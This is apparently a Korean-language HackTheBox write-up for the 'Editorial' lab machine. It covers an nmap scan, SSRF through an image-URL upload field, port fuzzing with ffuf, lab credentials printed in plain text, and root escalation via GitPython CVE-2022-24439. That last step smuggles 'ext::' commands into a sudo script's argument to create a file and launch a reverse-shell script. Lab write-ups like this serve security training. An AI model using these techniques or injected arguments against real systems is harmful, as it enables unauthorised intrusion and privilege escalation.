# Editorial - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA editorial 10.129.2.47
```
<img width="1104" height="281" alt="image" src="https://github.com/user-attachments/assets/75fdaf97-4aab-434c-98ab-9f98ff6a7413" />

- SSH(22)
- HTTP(80)

<br>

- `/etc/hosts`에 `editorial.htb` 추가.
<img width="1104" height="62" alt="image" src="https://github.com/user-attachments/assets/9c7f8858-b820-458a-9fa5-af41c6fa99c5" />

---
## HTTP(80)
### banner grabbing
<img width="1104" height="258" alt="image" src="https://github.com/user-attachments/assets/66f58361-3845-4ab1-922b-8245fa4c08ea" />

### SSRF
- `Puiblish withe us`탭에서 파일을 업로드하거나 서버로부터 이미지 파일을 가져올 수 있는 것처럼 보임.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/60649fa9-516c-40c8-9d88-6b39011a2d03" />

<br>
<br>

- `burpsuite`로 가로채서 확인해보니 로컬에 생성한 서버로 요청이 전달되면서 파일을 생성하는 것처럼 확인됨.
<img width="1548" height="399" alt="image" src="https://github.com/user-attachments/assets/5b56a52a-9741-4261-8e97-758c37baa883" />

<br>
<br>

- 응답으로 출력된 파일을 확인해보니 로컬 서버의 파일이 그대로 출력됨.
<img width="1104" height="373" alt="image" src="https://github.com/user-attachments/assets/4386b387-3e73-4a7b-8466-025e360289c0" />

<br>
<br>

- 로컬이 아닌 원격 서버에 시도를 해보니 시간이 오래걸리면서 응답이 출력됨.(80번 포트)
<img width="1548" height="421" alt="image" src="https://github.com/user-attachments/assets/5b44c9ab-3121-4ee2-8506-d224d1381307" />

<br>
<br>

- 포트를 변경했을 때는 80번 포트에 요청한 것보다 훨씬 빠른 속도로 출력됨.
- 특정 포트에 요청을 할 경우 서버에서 응답을 해 줄 것으로 예상.
<img width="1548" height="421" alt="image" src="https://github.com/user-attachments/assets/ec7721a5-c78c-4bf4-b6c6-5860cf45daa7" />

<br>
<br>

- 위의 요청을 `Copy to file`로 생성.
- 포트를 `FUZZ`로 변경하여 저장.
<img width="1104" height="444" alt="image" src="https://github.com/user-attachments/assets/6a77b8bb-7998-4857-9685-b18d9547bbdc" />

<br>
<br>

- 1~10000번 포트로 요청 시도.
- 사이즈가 다른 5000번 포트 발견.
```bash
ffuf -request req -w <(seq 1 10000) -request-proto http -fs 61
```
<img width="1104" height="55" alt="image" src="https://github.com/user-attachments/assets/7e2c1b4c-14bf-47d9-8e46-fcf3d5b7c5b0" />

<br>
<br>

- 5000번 포트로 요청 시도.
- 세션이 초기화되는지 잘 작동하지 않아서 `/upload`경로에서 직접 url를 입력하여 파일 확인.
<img width="1548" height="379" alt="image" src="https://github.com/user-attachments/assets/95b26d46-a3db-450a-b84e-58da0e86ee40" />

<br>
<br>

- api 요청들을 발견.
```bash
curl http://editorial.htb/static/uploads/048cafe7-368d-48ec-ae34-a4d7610650d0|jq
```
<img width="1104" height="539" alt="image" src="https://github.com/user-attachments/assets/f56ed12c-6a80-4a46-b635-e80c55ea179a" />

<br>
<br>

- `new_authors` api 요청.
<img width="1549" height="395" alt="image" src="https://github.com/user-attachments/assets/9ba7786f-7304-45ce-b2c6-68b32b357180" />

<br>
<br>

- `dev:dev080217_devAPI!@` 계정 발견.
```bash
curl http://editorial.htb/static/uploads/d8373d51-167c-47b6-9896-2ffe25ae3e57|jq
```
<img width="1105" height="243" alt="image" src="https://github.com/user-attachments/assets/0c371b18-ab01-4bea-8b5a-7781e7781cab" />

<br>
<br>

- `dev:dev080217_devAPI!@` SSH 로그인.
<img width="1105" height="40" alt="image" src="https://github.com/user-attachments/assets/b430639a-7a6d-4e77-82dc-fc3211955b0c" />

---
## Privesc
- `/apps`경로에서 `.git` 발견.
<img width="1105" height="99" alt="image" src="https://github.com/user-attachments/assets/1624d176-c0ad-4a3b-9102-dcd4904052d6" />

<br>
<br>

- `git log`를 사용하여 로그 확인.
<img width="1105" height="485" alt="image" src="https://github.com/user-attachments/assets/e2e6dedc-bd73-49d4-9471-a8d3af1a97c5" />

<br>
<br>

- `b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae` 커밋을 조사하여 `prod` 계정 발견.
<img width="1105" height="553" alt="image" src="https://github.com/user-attachments/assets/02b3af7a-990a-45f6-925b-c4d68a7205b7" />

<br>
<br>

- `prod:080217_Producti0n_2023!@` 로그인.
<img width="1105" height="80" alt="image" src="https://github.com/user-attachments/assets/d4e5a4d0-3551-49f0-bea4-487fdfe963da" />


### CVE-2022-24439
- `root` 권한으로 `/opt/internal_apps/clone_changes/clone_prod_change.py` 스크립트 실행 가능.
<img width="1105" height="137" alt="image" src="https://github.com/user-attachments/assets/31fdfce8-fc34-4e74-8b6c-8c9f331b1d66" />

<br>
<br>

- 스크립트 자체에서 특별한 점을 찾을 수 없어서 버전을 확인.
```bash
pip freeze|grep -i git
```
<img width="1105" height="60" alt="image" src="https://github.com/user-attachments/assets/45811cf9-6077-45f0-bebb-8fce71bfe344" />

<br>
<br>

- https://nvd.nist.gov/vuln/detail/cve-2022-24439
<img width="1209" height="506" alt="image" src="https://github.com/user-attachments/assets/e406ba2c-4c02-4ced-a52c-ab46798a5ea6" />

<br>
<br>

- https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
- 스크립트를 실행하면서 모든 인자를 검증 없이 입력을 하기에 명령어 실행이 가능해짐.
<img width="1129" height="394" alt="image" src="https://github.com/user-attachments/assets/6ee35fbc-ba7b-48f5-a0db-a4cd14639206" />

<br>
<br>

- 명령어 실행.
```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwned'
```
<img width="1104" height="400" alt="image" src="https://github.com/user-attachments/assets/c1626bdf-0acf-4116-b835-5fe8b59787ee" />

<br>
<br>

- `pwned` 생성 확인.
<img width="1104" height="135" alt="image" src="https://github.com/user-attachments/assets/83e28203-7bee-4bb3-9698-1e39c0b7a8b8" />

<br>
<br>

- 리버스 셸 스크립트 생성.
<img width="1104" height="58" alt="image" src="https://github.com/user-attachments/assets/f06eac37-491d-4086-ac24-b7c55340f4ab" />

<br>
<br>

- 스크립트 실행.
```bash
sudo /usr/bin/python3 /opt/internprod@editorial:/tmp$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::/bin/bash /tmp/ex.sh'
```
<img width="1104" height="43" alt="image" src="https://github.com/user-attachments/assets/250bc775-c30b-4438-97bd-b4102701b984" />

<br>
<br>

- 셸 획득.
<img width="1104" height="141" alt="image" src="https://github.com/user-attachments/assets/7e2a6753-33f0-455e-85ab-d419e0226e3d" />

---
## FLAG
- `/home/dev/user.txt`
<img width="1104" height="248" alt="image" src="https://github.com/user-attachments/assets/b16b3234-e52d-4f4b-9bc4-f6e741a2b2f0" />

<br>
<br>

- `/root/root.txt`
<img width="1104" height="252" alt="image" src="https://github.com/user-attachments/assets/8ae74f1a-6d56-4c5e-b33a-f957f54432e7" />
